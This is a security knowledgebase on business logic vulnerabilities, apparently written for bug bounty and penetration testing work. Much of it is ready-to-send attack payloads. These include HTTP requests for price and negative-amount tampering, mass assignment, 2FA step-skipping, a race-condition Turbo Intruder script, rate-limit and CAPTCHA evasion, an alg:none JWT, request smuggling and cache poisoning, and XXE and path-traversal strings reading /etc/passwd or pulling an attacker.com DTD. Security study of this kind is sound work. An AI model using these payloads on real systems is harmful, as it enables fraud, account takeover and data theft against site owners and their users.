# Business Logic Vulnerabilities Knowledgebase

> **Research-grade reference for advanced bug bounty hunting, black-box testing, and application security assessments**
>
> Compiled from PortSwigger Web Security Academy, PortSwigger Research, PayloadsAllTheThings, HackTricks, OWASP, ProjectDiscovery tools, and real-world bug bounty findings.
> Last updated: 2026-05-24

---

## Table of Contents

1. [Basics](#basics)
2. [Business Logic Theory](#business-logic-theory)
3. [Workflow Abuse Techniques](#workflow-abuse-techniques)
4. [Business Logic Payloads](#business-logic-payloads)
5. [Coupon Abuse Payloads](#coupon-abuse-payloads)
6. [Race Condition Exploitation](#race-condition-exploitation)
7. [Multi-Step Process Bypasses](#multi-step-process-bypasses)
8. [Trust Boundary Abuse](#trust-boundary-abuse)
9. [Finite State Machine Abuse](#finite-state-machine-abuse)
10. [Anti-Automation Bypasses](#anti-automation-bypasses)
11. [Rate Limit Bypass Payloads](#rate-limit-bypass-payloads)
12. [OAuth + Business Logic Chains](#oauth--business-logic-chains)
13. [Cache Poisoning + Business Logic Chains](#cache-poisoning--business-logic-chains)
14. [Request Smuggling + Business Logic Chains](#request-smuggling--business-logic-chains)
15. [IDOR + Business Logic Chains](#idor--business-logic-chains)
16. [Parser Confusion Payloads](#parser-confusion-payloads)
17. [Browser Quirks](#browser-quirks)
18. [Gadget Chains](#gadget-chains)
19. [Real World Case Studies](#real-world-case-studies)
20. [Fuzzing Payloads](#fuzzing-payloads)
21. [Automation Workflows](#automation-workflows)
22. [Recon Methodology](#recon-methodology)
23. [Nuclei Templates](#nuclei-templates)
24. [Tools and Scanners](#tools-and-scanners)
25. [Advanced Research](#advanced-research)
26. [Bug Bounty Writeups](#bug-bounty-writeups)
27. [Payload Collections](#payload-collections)
28. [Detection Techniques](#detection-techniques)
29. [References](#references)

---

## Basics

### What Are Business Logic Vulnerabilities?

Business logic vulnerabilities are flaws in the **design and implementation** of an application that allow an attacker to elicit unintended behavior. They enable attackers to manipulate legitimate functionality to achieve malicious goals.

**Key Characteristics:**
- Invisible to normal application use
- Result from flawed assumptions about user behavior
- Often unique to the specific application and business domain
- Difficult to detect with automated scanners
- High-value targets for bug bounty hunters

### Synonyms
- Application logic vulnerabilities
- Logic flaws
- Workflow vulnerabilities
- State machine abuse

### Impact Spectrum
| Severity | Examples |
|----------|----------|
| Critical | Authentication bypass, privilege escalation, financial fraud |
| High | Unauthorized data access, workflow bypass, mass assignment |
| Medium | Feature abuse, information disclosure, business rule bypass |
| Low | Minor state inconsistencies, debug info leakage |

---

## Business Logic Theory

### Core Principles

1. **Assumption Failure**: Vulnerabilities arise when developers make incorrect assumptions about:
   - How users interact with the application
   - Sequence of operations
   - Data validation boundaries
   - Trust boundaries

2. **State Management**: Applications transition through states. Logic flaws occur when:
   - States are not properly validated
   - Transitions are not properly enforced
   - Sub-states exist that are exploitable (race conditions)

3. **Trust Boundaries**: Applications define trust zones. Flaws occur when:
   - Client-side controls are trusted implicitly
   - User input is not validated server-side
   - Session state is assumed to be consistent

### The "Everything Is Multi-Step" Principle (PortSwigger Research)

> "Every pentester knows that multi-step sequences are a hotbed for vulnerabilities, but with race conditions, everything is multi-step." - James Kettle

Every HTTP request may transition an application through multiple **fleeting, hidden states** (sub-states). If timed correctly, these sub-states can be abused for unintended transitions.

### Common Root Causes

```
┌─────────────────────────────────────────────────────────────┐
│  DEVELOPER ASSUMPTION                    REALITY              │
├─────────────────────────────────────────────────────────────┤
│  Users only use the web UI              Attackers use proxies │
│  Client-side validation is sufficient   Easily bypassed       │
│  Users follow intended workflow         Forced browsing       │
│  Mandatory fields are always present    Parameters removable  │
│  Trusted users stay trustworthy         Privilege escalation  │
│  Requests are atomic                    Sub-states exist     │
│  Numeric inputs are positive            Negative values work  │
└─────────────────────────────────────────────────────────────┘
```

---

## Workflow Abuse Techniques

### 1. Excessive Trust in Client-Side Controls

**Concept**: Assuming users will only interact via the provided web interface, relying on client-side validation.

**Attack**: Use Burp Proxy/Repeater to tamper with data after browser sends it but before server-side logic processes it.

```http
# Client-side price validation bypass
POST /cart/checkout HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

product_id=123&quantity=1&price=0.01&total=0.01
# ^ Modified from original price=99.99
```

### 2. Failing to Handle Unconventional Input

**Concept**: Applications accept data types but don't enforce business rules on the values.

**Attack Vectors**:
- Negative numeric values
- Zero values
- Maximum integer overflow (`2147483647`, `9223372036854775807`)
- Scientific notation (`1e309`)
- Null bytes, Unicode, special characters

```http
# Negative transfer exploit
POST /transfer HTTP/1.1
Host: bank.target.com
Content-Type: application/json

{
  "from_account": "attacker",
  "to_account": "victim",
  "amount": -1000
}
# Logic: if (amount <= balance) { transfer; }
# -1000 <= balance = TRUE → victim sends $1000 to attacker
```

```http
# Integer overflow in quantity
POST /cart/add HTTP/1.1
Host: shop.target.com

product_id=1&quantity=2147483648&price=10
# Overflow wraps to negative, total becomes negative
```

### 3. Flawed Assumptions About User Behavior

#### A. Trusted Users Won't Always Remain Trustworthy

**Concept**: Passing strict controls initially, then assuming the user/data is trusted indefinitely.

**Example**: Admin approval workflow where approved users gain permanent elevated access without re-verification.

#### B. Users Won't Always Supply Mandatory Input

**Concept**: Assuming required fields will always be present.

**Testing Methodology**:
```
1. Remove each parameter in turn
2. Delete parameter name AND value
3. Follow multi-stage processes to completion
4. Check both URL and POST parameters
5. Check cookies too
```

```http
# Parameter removal to access hidden code paths
POST /api/user HTTP/1.1
Host: target.com

# Original: action=update&role=user
# Test 1: action=update (remove role)
# Test 2: role=user (remove action)
# Test 3: action=delete&role=admin (change action)
```

#### C. Users Won't Always Follow the Intended Sequence

**Concept**: Assuming users complete workflows in order.

**Attack**: Forced browsing to skip steps, replay steps, or access steps out of order.

```http
# 2FA Bypass via step skipping
# Normal flow: POST /login → GET /2fa → POST /2fa/verify → GET /dashboard
# Attack: After POST /login, directly GET /dashboard

GET /dashboard HTTP/1.1
Host: target.com
Cookie: session=valid_session_from_login_step
```

### 4. Domain-Specific Flaws

**Online Shop Discount Abuse**:
```
1. Add items to cart until reaching $1000 threshold
2. Apply 10% discount (now cart qualifies for discount)
3. Remove items to keep only desired product
4. Discount remains applied to sub-$1000 order
```

**Testing Approach**:
- Identify price-sensitive operations
- Understand when adjustments are made
- Manipulate application state so adjustments don't match criteria

### 5. Providing an Encryption Oracle

**Concept**: User-controllable input is encrypted and ciphertext is returned to the user.

**Risk**: Can encrypt arbitrary data using the application's algorithm and key.

```http
# Encryption oracle detection
POST /api/encrypt HTTP/1.1
Host: target.com

{"data": "attacker_controlled_value"}
# Response contains encrypted ciphertext

# Later use this ciphertext in another function expecting encrypted input
POST /api/decrypt-action HTTP/1.1
Host: target.com

{"encrypted_param": "ciphertext_from_oracle"}
```

### 6. Email Address Parser Discrepancies

**Concept**: Different parts of the application parse email addresses differently.

**Attack**: Use encoding to disguise email parts.

```
# Gmail dot trick: john.doe@gmail.com = johndoe@gmail.com
# Plus addressing: johndoe+admin@gmail.com
# Unicode normalization: ｊｏｈｎ@ｅｘａｍｐｌｅ．ｃｏｍ
# Case sensitivity discrepancies
```

---

## Business Logic Payloads

### Numeric Manipulation

```http
# Negative quantity
quantity=-1

# Zero quantity with other items
quantity=0&product_id=1

# Maximum integer
quantity=2147483647

# Long long overflow
quantity=9223372036854775808

# Float precision abuse
price=0.9999999999999999

# Scientific notation
amount=1e309

# Null/empty values
quantity=&product_id=1
quantity[]=1&quantity[]=2
```

### Parameter Pollution

```http
# HTTP Parameter Pollution (HPP)
POST /checkout HTTP/1.1

product_id=1&product_id=2&product_id=3
# Backend may process first, last, or all values

# Array injection (PHP)
param[]=value1&param[]=value2
# Results in param = ['value1', 'value2']

# Nested object injection
param[key1][key2]=value
# Results in param = {'key1': {'key2': 'value'}}
```

### Mass Assignment

```http
# Hidden parameter discovery
POST /api/users HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "attacker",
  "password": "password123",
  "role": "admin",
  "is_admin": true,
  "credit_balance": 999999
}
```

### Type Confusion

```http
# Boolean to string confusion
is_premium=true
is_premium=1
is_premium=yes
is_premium[]=  # Empty array = truthy in PHP

# String to array confusion
{"id": "123"} → {"id": ["123"]}

# JSON type juggling
{"amount": "100"} vs {"amount": 100}
{"amount": null} vs {"amount": 0}
```

### Workflow State Manipulation

```http
# Step skipping
# Step 1: POST /register
# Step 2: POST /verify (skip this)
# Step 3: GET /dashboard (access directly)

GET /dashboard HTTP/1.1
Cookie: session=step1_session_token

# Step replay
POST /apply-discount HTTP/1.1
Cookie: session=same_session
# Replay multiple times to stack discounts

# Reverse workflow
# Complete checkout, then add more items
POST /cart/add HTTP/1.1
Cookie: session=post_checkout_session
```

---

## Coupon Abuse Payloads

### Single-Coupon Multiple Use

```http
# Race condition coupon abuse
# Send 20 parallel requests with same coupon

POST /cart/apply-coupon HTTP/2
Host: target.com

{"coupon": "SINGLE-USE-CODE", "cart_id": "123"}
```

### Coupon Stacking

```http
# Parameter pollution for multiple coupons
POST /checkout HTTP/1.1

coupon=CODE1&coupon=CODE2&coupon=CODE3
# Or
coupon[]=CODE1&coupon[]=CODE2
```

### Coupon Code Guessing

```
# Common patterns
SAVE10, SAVE20, WELCOME, NEWUSER, BLACKFRIDAY
SPRING2024, SUMMER25, HOLIDAY50
TEST, TESTING, DEV, STAGING
COMPANYNAME10, COMPANYNAME20

# Sequential brute force
CODE001, CODE002, CODE003...

# Common transformations
SAVE10 → save10 → Save10 → S@VE10
```

### Gift Card Abuse

```http
# Race condition gift card redemption
POST /gift/redeem HTTP/2
Host: target.com

{"code": "GIFT-CARD-CODE"}
# Send 20-30 parallel requests via single-packet attack
```

### Discount Application Timing

```
1. Add $1000 worth of items
2. Apply 20% off coupon (cart now $800)
3. Remove $900 worth of items (cart now $80 with 20% off)
4. Discount applied to $100 order, not $1000
```

---

## Race Condition Exploitation

### Fundamentals

Race conditions occur when websites process requests concurrently without adequate safeguards. Multiple threads interact with the same data simultaneously, causing "collisions" that result in unintended behavior.

**Race Window**: The period during which a collision is possible — often milliseconds.

### Types of Race Conditions

#### 1. Limit Overrun (TOCTOU)

**Time-of-Check to Time-of-Use** flaws:

```
# Classic limit overrun: Coupon multiple use
Request 1: Check if coupon used? → FALSE → Apply discount → Set used=TRUE
Request 2: Check if coupon used? → FALSE → Apply discount → Set used=TRUE

# Both requests pass the check before either sets the flag
```

**Exploitation Targets**:
- Gift card redemption (redeem multiple times)
- Product rating (rate multiple times)
- Cash withdrawal (exceed balance)
- CAPTCHA reuse
- Anti-brute-force bypass
- Vote manipulation
- Referral bonus abuse

#### 2. Hidden Multi-Step Sequences (State Machine Abuse)

**Concept**: A single request initiates an entire multi-step sequence behind the scenes, transitioning through multiple hidden sub-states.

**Example - MFA Bypass**:
```python
# Server-side pseudo-code
session['userid'] = user.userid
if user.mfa_enabled:
    session['enforce_mfa'] = True
    # generate and send MFA code
    # redirect to MFA form
```

**Sub-state**: After `session['userid']` is set but before `session['enforce_mfa']` is set, the user has a valid logged-in session without MFA enforcement.

**Exploit**:
```http
# Request 1: Login (triggers sub-state)
POST /login HTTP/2
Host: target.com

{"username": "victim", "password": "pass"}

# Request 2: Access sensitive endpoint during race window
GET /admin HTTP/2
Host: target.com
Cookie: session=same_session_cookie
```

#### 3. Single-Endpoint Collisions

**Concept**: Sending parallel requests with different values to a single endpoint.

**Example - Password Reset Token Swap**:
```http
# Request 1: Reset password for hacker
POST /reset-password HTTP/2
Host: target.com
Cookie: session=b94

{"userid": "hacker"}

# Request 2: Reset password for victim (same session)
POST /reset-password HTTP/2
Host: target.com
Cookie: session=b94

{"userid": "victim"}
```

**Result**: Session may contain `userid=victim` but reset token sent to hacker.

#### 4. Multi-Endpoint Race Conditions

**Example - Payment Validation Bypass**:
```
# State machine: basket_pending → payment_validated → basket_confirmed
# Race window between payment validation and order confirmation

# Request 1: POST /makePayment (triggers validation)
# Request 2: POST /cart/add (adds item during race window)
# Result: Item added after payment but before confirmation = free item
```

#### 5. Partial Construction Race Conditions

**Concept**: Objects created in multiple steps leave temporary exploitable middle states.

**Example - User Registration**:
```python
# Step 1: INSERT INTO users (username) VALUES ('attacker')
# Step 2: UPDATE users SET api_key = 'generated_key' WHERE username = 'attacker'
# Race window: user exists but api_key is NULL/uninitialized
```

**Exploit**:
```http
# During race window, API key check may match empty/null
GET /api/user/info?user=victim&api-key[]= HTTP/2
Host: target.com
# api-key[]= creates empty array, may match uninitialized value
```

### The Single-Packet Attack

**Purpose**: Neutralize network jitter by sending 20-30 requests in a single TCP packet.

**HTTP/2 Implementation**:
```python
# Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    # Queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')

    # Send all requests in gate '1' in parallel
    engine.openGate('1')
```

**How It Works**:
1. Pre-send bulk of each request (headers + body except last byte)
2. Wait 100ms for initial frames to be sent
3. Ensure TCP_NODELAY is disabled (Nagle's algorithm batches final frames)
4. Send ping packet to warm connection
5. Send withheld final frames — they land in single packet

**Benchmark Results**:
| Technique | Median Spread | Standard Deviation |
|-----------|--------------|-------------------|
| Last-byte sync | 4ms | 3ms |
| Single-packet attack | 1ms | 0.3ms |

### Methodology: Predict → Probe → Prove

```
┌──────────┐    ┌──────────┐    ┌──────────┐
│ PREDICT  │───→│  PROBE   │───→│  PROVE   │
│          │    │    ↑     │    │          │
│ Potential│    │  Clues   │    │ Concept  │
│ Collisions│   │          │    │          │
└──────────┘    └──────────┘    └──────────┘
```

**Predict**:
- Is endpoint security critical?
- Is there collision potential? (two+ requests touching same record)
- How is state stored? (persistent server-side = ideal)
- Are we editing or appending? (editing = more collision potential)
- What's the operation keyed on? (same key = collision)

**Probe**:
- Benchmark normal behavior (sequential requests)
- Send parallel requests using single-packet attack
- Look for ANY deviation: response changes, email contents, application behavior
- Pay attention to processing time (shorter = separate thread, longer = locking)

**Prove**:
- Eliminate unnecessary requests (2 should suffice)
- Retry multiple times if timing-sensitive
- Automate with Turbo Intruder scripts
- Escalate: think of race condition as structural weakness, not isolated bug

### Connection Warming & Rate Limit Abuse

**Problem**: Different endpoints have different processing times, making race windows misaligned.

**Solutions**:
1. **Connection Warming**: Send `GET /` to start of tab group, use "Send group in sequence (single connection)"
2. **Client-Side Delay**: Use Turbo Intruder delay (but loses single-packet advantage)
3. **Rate Limit Abuse**: Send dummy requests to trigger rate limiting, causing server-side delay that aligns windows:

```
Slow endpoint:  +10 dummy requests → delay → delay → fast endpoint
Fast endpoint:  delay → delay → fast endpoint
Result: Race windows align!
```

### Session-Based Locking Bypass

**Detection**: If all requests process sequentially, check for session locking.

**Bypass**: Use different session tokens for each parallel request.

```http
# Request 1
POST /action HTTP/2
Cookie: session=token1

# Request 2
POST /action HTTP/2
Cookie: session=token2
```

**Note**: PHP's native session handler processes one request per session at a time.

### Deferred Collisions

**Concept**: Critical data processing happens in background batches, not immediately.

**Characteristics**:
- No immediate clues (no response differences)
- Detection relies on second-order clues (emails, behavior changes)
- Collisions not dependent on synchronized requests
- May appear without deliberate testing

**Example**: Email change requests processed with 20-minute delay between them still cause collisions.

---

## Multi-Step Process Bypasses

### Authentication Flow Bypass

```
# Normal: Login → 2FA → Dashboard
# Bypass: Login → Dashboard (skip 2FA)

POST /login HTTP/1.1
Host: target.com

username=admin&password=admin

# Capture session cookie, then:
GET /admin/dashboard HTTP/1.1
Host: target.com
Cookie: session=captured_from_login
```

### Payment Flow Bypass

```
# Normal: Cart → Shipping → Payment → Confirmation
# Bypass: Cart → Confirmation (skip payment)

POST /checkout/confirm HTTP/1.1
Host: target.com
Cookie: session=valid_session

# Without going through payment step
```

### Approval Workflow Bypass

```http
# Step 1: Submit request
POST /api/requests HTTP/1.1

{"type": "budget", "amount": 100000}
# Returns: {"id": 123, "status": "pending_approval"}

# Step 2: Check if approval can be bypassed
PATCH /api/requests/123 HTTP/1.1

{"status": "approved"}
# Or
POST /api/requests/123/approve HTTP/1.1
# Without manager credentials
```

### E-Signature Bypass

```http
# Normal: Document → Review → Sign → Submit
# Bypass: Document → Submit (skip signing)

POST /contracts/123/submit HTTP/1.1
Host: target.com
Cookie: session=user_session

# Skip the /contracts/123/sign step
```

### File Upload Multi-Step Abuse

```
1. Upload file (returns file_id)
2. File scanned for malware (async)
3. File attached to message

# Race condition: Attach file before scan completes
POST /messages HTTP/1.1

{"content": "Hello", "attachment": "file_id_from_step_1"}
# Malicious file attached before rejection
```

---

## Trust Boundary Abuse

### Client-Side Control Bypass

```javascript
// Client-side validation (easily bypassed)
function validatePrice() {
    var price = document.getElementById('price').value;
    if (price < 0) {
        alert("Invalid price");
        return false;
    }
}

// Server receives:
POST /api/order HTTP/1.1

{"product_id": 1, "quantity": 1, "price": -100}
```

### Hidden Field Manipulation

```http
POST /checkout HTTP/1.1
Host: target.com

product_id=1&price=99.99&hidden_discount=0.9&hidden_role=admin
# Modify hidden fields that server still processes
```

### Cookie/Token Trust Abuse

```http
# JWT manipulation
Cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
# Algorithm: none, role: admin

# Cookie value manipulation
Cookie: is_premium=true
Cookie: user_role=administrator
Cookie: access_level=999
```

### Referer/Origin Trust

```http
# Server trusts requests from specific referer
POST /admin/action HTTP/1.1
Host: target.com
Referer: https://target.com/admin/dashboard
Origin: https://target.com

# These can be spoofed in some contexts
```

---

## Finite State Machine Abuse

### State Machine Concepts

Applications are finite state machines with:
- **States**: Valid conditions (logged_out, pending_mfa, authenticated, admin)
- **Transitions**: Actions that change states (login, verify_mfa, logout)
- **Sub-states**: Temporary states within a single request processing

### Exploiting Sub-states

```
# Accurate state machine for login:
null ──POST /login──→ admin ──GET /role──→ pending ──POST /role──→ staff
                         ↑
                    Race window!

# Attacker skips GET /role, goes directly to admin application
```

### State Confusion Attacks

```http
# Confuse application about current state
# Request 1: Start password reset
POST /reset/start HTTP/1.1
Cookie: session=A

{"email": "victim@target.com"}

# Request 2: Complete reset with different token
POST /reset/complete HTTP/1.1
Cookie: session=A

{"token": "attacker_token", "password": "newpass"}
```

### State Machine Enumeration

```
# Identify all states and transitions
1. Map every endpoint that changes state
2. Identify state variables (session, database, tokens)
3. Find transitions that don't properly validate current state
4. Look for missing transitions (can you go from A to C without B?)
```

---

## Anti-Automation Bypasses

### CAPTCHA Bypass Techniques

```
1. Race condition reuse (single CAPTCHA solution used multiple times)
2. Audio CAPTCHA automation (speech-to-text)
3. Third-party CAPTCHA solving services
4. Token extraction from page source
5. Client-side CAPTCHA validation bypass
```

```http
# CAPTCHA token reuse via race condition
POST /submit HTTP/2
Host: target.com

{"captcha_response": "same_token", "data": "payload1"}
# Send 20 parallel requests with same token
```

### Bot Detection Evasion

```
# Header rotation
User-Agent: Mozilla/5.0... (rotate through list)
Accept-Language: en-US,en;q=0.9 (vary)
Referer: https://google.com (legitimate referers)

# Request timing jitter
Add random delays between requests (1-5 seconds)

# Mouse/keyboard simulation
Use headless browser with human-like interaction patterns
```

### Rate Limit Evasion

```
1. IP rotation (proxies, VPNs, Tor)
2. Distributed attacks (multiple accounts)
3. Slow attacks (stay below threshold)
4. Request splitting (one logical action = multiple requests)
5. Credential stuffing with timing randomization
```

---

## Rate Limit Bypass Payloads

### Distributed Attack Patterns

```python
# Multiple accounts, same action
accounts = ["user1", "user2", "user3", ...]
for account in accounts:
    login(account, password)
    # Each account has its own rate limit bucket
```

### Header-Based Bypass

```http
# X-Forwarded-For spoofing to bypass IP-based limits
POST /login HTTP/1.1
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 5.6.7.8
X-Real-IP: 9.10.11.12
Client-IP: 13.14.15.16

# Some systems use first, others use last, others use specific header
```

### Timing-Based Bypass

```python
# Exponential backoff evasion
import random, time

def evade_rate_limit():
    base_delay = 60 / rate_limit_threshold
    jitter = random.uniform(0.5, 1.5)
    time.sleep(base_delay * jitter)
```

### Resource Exhaustion

```http
# Trigger rate limit on others to gain advantage
# Send massive traffic to trigger global rate limit
# Then exploit race conditions during rate limit recovery
```

---

## OAuth + Business Logic Chains

### Hidden OAuth Attack Vectors

#### 1. Dynamic Client Registration SSRF

```http
# OAuth registration endpoint
POST /connect/register HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
  "application_type": "web",
  "redirect_uris": ["https://attacker.com/callback"],
  "client_name": "My App",
  "logo_uri": "http://attacker.com/xss.html",
  "jwks_uri": "http://attacker.com/keys.jwks",
  "sector_identifier_uri": "http://attacker.com/uris.json",
  "request_uris": ["http://attacker.com/request.jwt"]
}
```

**SSRF Triggers**:
- `logo_uri`: Server fetches image for consent screen
- `jwks_uri`: Server fetches keys when validating JWT client assertions
- `sector_identifier_uri`: Server fetches redirect URI list
- `request_uri`: Server fetches request JWT at authorization time

#### 2. redirect_uri Session Poisoning

```
# OAuth flow with session-based parameter storage:
# /authorize → /login → /confirm_access

# Attack flow:
1. User visits attacker page
2. Page redirects to /authorize?client_id=TRUSTED&redirect_uri=legitimate
3. Background: Page sends request to /authorize?client_id=ATTACKER&redirect_uri=evil
4. User approves first request
5. Session contains ATTACKER's redirect_uri
6. Code/token leaked to evil.com
```

```http
# MITREid Connect mass assignment variant
GET /oauth/confirm_access?client_id=trusted&redirectUri=http://evil.com HTTP/1.1
Host: target.com
Cookie: session=poisoned_session
```

#### 3. WebFinger User Enumeration

```http
GET /.well-known/webfinger?resource=http://x/admin&rel=http://openid.net/specs/connect/1.0/issuer HTTP/1.1
Host: target.com

# 200 OK = user exists
# 404 = user doesn't exist
```

### OAuth Business Logic Chains

```
Chain 1: OAuth SSRF → Internal Service Access → Business Logic Abuse
Chain 2: redirect_uri Poisoning → Token Leak → Account Takeover
Chain 3: State Parameter Bypass → CSRF → Unauthorized Authorization
Chain 4: Scope Escalation → Access to Premium Features
```

---

## Cache Poisoning + Business Logic Chains

### Web Cache Poisoning Fundamentals

**Cache Key**: Components used to identify cached resources (method, path, query, Host header).
**Unkeyed Components**: Headers, cookies, body that affect response but aren't in cache key.

### Cache Key Manipulation

```http
# Unkeyed query string exploitation
GET /?q=canary HTTP/1.1
Host: target.com

# If query string not in cache key:
GET / HTTP/1.1
Host: target.com
# Returns poisoned response!
```

### Cache Parameter Cloaking

```http
# Akamai akamai-transform parameter exclusion
GET /en?x=1?akamai-transform=payload HTTP/1.1
Host: target.com
# Cache key: /en?x=1
# Backend sees: x=1, akamai-transform=payload

# Rails ; delimiter abuse
GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1
# Cache key: callback=legit
# Rails sees: callback=alert(1)//
```

### Fat GET Poisoning

```http
# Varnish/Rack::Cache behavior: GET body forwarded but not in cache key
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
# Cache key: /contact/report-abuse?report=albinowax
# Backend processes: report=innocent-victim
```

### Business Logic + Cache Chains

```
Chain 1: Cache Poisoning → Stored XSS → Session Hijacking → Admin Access
Chain 2: Cache Key Injection → OAuth redirect_uri Poisoning → Token Theft
Chain 3: Fat GET → Parameter Override → IDOR → Data Exfiltration
Chain 4: Cache Normalization → Path Confusion → Business Logic Bypass
```

---

## Request Smuggling + Business Logic Chains

### HTTP Request Smuggling Types

```
CL.TE: Front-end uses Content-Length, Back-end uses Transfer-Encoding
TE.CL: Front-end uses Transfer-Encoding, Back-end uses Content-Length
H2.CL: HTTP/2 to HTTP/1.1 downgrade, front-end uses H2 length, back-end uses Content-Length
H2.TE: HTTP/2 to HTTP/1.1 downgrade, front-end uses H2 length, back-end uses Transfer-Encoding
CL.0: Back-end ignores Content-Length (treats as 0)
H2.0: HTTP/2 request without Content-Length, back-end ignores it
0.CL: Front-end ignores Content-Length, back-end uses it
TE.0: Transfer-Encoding with chunk extensions causing desync
```

### CL.0 Desync (Browser-Powered)

```http
# Valid, specification-compliant request that browsers can send
POST /static/file.css HTTP/1.1
Host: target.com
Content-Length: 35

GET /admin HTTP/1.1
X: Y
```

**Browser Exploitation**:
```javascript
fetch('https://target.com/static/file.css', {
    method: 'POST',
    body: "GET /admin HTTP/1.1
X: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://target.com/'
})
```

### Business Logic + Smuggling Chains

```
Chain 1: Request Smuggling → Admin Panel Access → User Management Abuse
Chain 2: Request Smuggling → Internal API Access → Business Rule Bypass
Chain 3: Client-Side Desync → Cookie Theft → Account Takeover → Financial Fraud
Chain 4: Pause-Based Desync → Session Fixation → Authentication Bypass
```

### Expect-Based Desync (2025 Research)

```http
# Vanilla Expect header causing 0.CL desync
POST /endpoint HTTP/1.1
Host: target.com
Expect: 100-continue
Content-Length: 7

GET /404
```

```http
# Obfuscated Expect bypassing response header removal
POST /endpoint HTTP/1.1
Host: target.com
Expect: 100-continue
X-Injected: value
Content-Length: 7
```

---

## IDOR + Business Logic Chains

### IDOR Fundamentals

**Insecure Direct Object Reference**: Accessing objects by modifying identifiers in requests.

### IDOR + Workflow Abuse

```http
# Step 1: Create resource as User A
POST /api/orders HTTP/1.1
Cookie: session=user_a

{"items": [...]}
# Returns: {"order_id": 12345}

# Step 2: Access/modify as User B (IDOR)
GET /api/orders/12345 HTTP/1.1
Cookie: session=user_b

# Step 3: Modify order details
PUT /api/orders/12345 HTTP/1.1
Cookie: session=user_b

{"shipping_address": "attacker_address", "payment_method": "attacker_card"}
```

### IDOR + State Machine Abuse

```http
# Workflow: Order states: pending → processing → shipped → delivered
# User can only cancel "pending" orders

# IDOR to access cancellation endpoint for shipped orders
POST /api/orders/12345/cancel HTTP/1.1
Cookie: session=user

# Bypass state check via IDOR on admin endpoint
POST /admin/orders/12345/cancel HTTP/1.1
Cookie: session=user
```

### IDOR + Mass Assignment

```http
# Update profile with IDOR
PUT /api/users/56789 HTTP/1.1
Cookie: session=attacker

{
  "email": "victim@target.com",
  "role": "admin",
  "is_verified": true,
  "subscription_tier": "enterprise"
}
```

---

## Parser Confusion Payloads

### HTTP Parser Discrepancies

```http
# Header obfuscation techniques
Transfer-Encoding : chunked
Transfer-Encoding: chunked
X-Ignore: test
 Transfer-Encoding: chunked
Transfer-Encoding	: chunked
Transfer-Encoding: chunk\x00ed
X-Transfer-Encoding: chunked

# Content-Length confusion
Content-Length: 5
Content-Length: 50
Content-Length
: 50
 Content-Length: 50
Content-Length:
50
```

### URL Parsing Discrepancies

```
# Path traversal variations
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..\..\..\etc\passwd
..%5c..%5c..%5cetc%5cpasswd

# Query string parsing differences
?param=value&param=value2  (PHP: last wins, ASP: first wins)
?param[]=value1&param[]=value2  (PHP: array)
?param[value1]=a&param[value2]=b  (PHP: nested array)
```

### JSON Parser Differences

```json
// Trailing commas
{"key": "value",}

// Duplicate keys
{"key": "safe", "key": "dangerous"}

// Type confusion
{"count": "1"} vs {"count": 1}
{"enabled": "true"} vs {"enabled": true}

// Nested objects
{"user": {"role": "admin"}}
// vs flattened:
{"user.role": "admin"}
```

### XML Parser Confusion

```xml
<!-- Entity expansion -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- DTD external -->
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">

<!-- XInclude -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## Browser Quirks

### Connection Pool Behavior

```
Chrome maintains separate connection pools:
- With credentials (cookies)
- Without credentials

Exploitation: Must poison correct pool for target request type
```

### CORS and Mode Behaviors

```javascript
// mode: 'no-cors' - visible connection ID, but opaque response
fetch('https://target.com/', {
    method: 'POST',
    body: payload,
    mode: 'no-cors',
    credentials: 'include'
})

// mode: 'cors' - triggers CORS error, prevents redirect following
fetch('https://target.com/', {
    method: 'POST',
    body: payload,
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    // Redirect not followed - can continue attack
    location = 'https://target.com/'
})
```

### Stacked Response Problem

```
Browsers discard connections if they receive more response data than expected.
This affects reliability of multi-response techniques.

Solution: Use cache-busters to delay responses, or pad requests to consume extra data.
```

### HEAD Method Quirks

```http
# HEAD responses contain headers but no body
# Can be combined with subsequent responses

POST /endpoint HTTP/1.1
Host: target.com
Content-Length: 67

HEAD /404/?cb=123 HTTP/1.1
GET /x?<script>evil()</script> HTTP/1.1
X: Y
```

### HSTS and Mixed Content

```
Safari: If attacker domain in HSTS cache, HTTP redirect auto-upgraded to HTTPS
Edge: 302 redirect to HTTPS bypasses mixed-content protection
```

---

## Gadget Chains

### Open Graph Hijacking

```http
# Poison og:url to control social sharing
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response:
<meta property="og:url" content="https://attacker.com/"/>
# Anyone sharing this page shares attacker's content
```

### JavaScript Resource Poisoning

```http
# Poison script src to execute attacker code
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response:
<script src="https://attacker.com/app.js"></script>
```

### Host Header Redirect Gadget

```http
# Trigger redirect to attacker domain
GET /+webvpn+/ HTTP/1.1
Host: attacker.com

# Response:
HTTP/1.1 302 Found
Location: https://attacker.com/+webvpn+/
```

### CSS Injection via Cache Poisoning

```http
# Poison CSS import
GET /style.css?x=a);@import... HTTP/1.1

# Response:
@import url(/site/home/index.css?x=a);@import...
# Inject malicious CSS that exfiltrates data
```

### Translation File Hijacking (DOM Poisoning)

```http
# Poison data-site-root attribute
GET /dataset HTTP/1.1
Host: target.com
